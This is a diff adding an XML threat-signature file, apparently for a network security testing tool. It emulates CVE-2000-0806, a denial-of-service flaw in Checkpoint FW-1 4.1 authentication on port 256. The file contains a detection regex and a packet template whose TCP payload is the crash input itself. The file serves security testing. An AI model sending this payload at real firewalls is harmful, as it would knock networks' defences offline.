@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="FW-1 Replay Denial Of Service"/>
+    <EngDesc display="true" value="This threat causes a denial of service on a Checkpoint FW-1 firewall.  It takes advantage of a flaw in the authentication mechanism.  The FW-1 authentication system listens on port 256."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Firewall"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Checkpoint"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Checkpoint_FW1"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Checkpoint_FW1_4.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://xforce.iss.net/static/5162.php"/>
+    <CVEID display="true" value="CVE-2000-0806"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="4413"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001059814922700c000a80001003c4aa1d548"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725924037187500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\X30\XAF\X72\X61\X6E\X64\X01\X73\X69\X67\X6E"/>
+    <Created value="1139462047" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3030303030303030303030303030303030303030303030303030303030303030AF72616E64017369676E" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
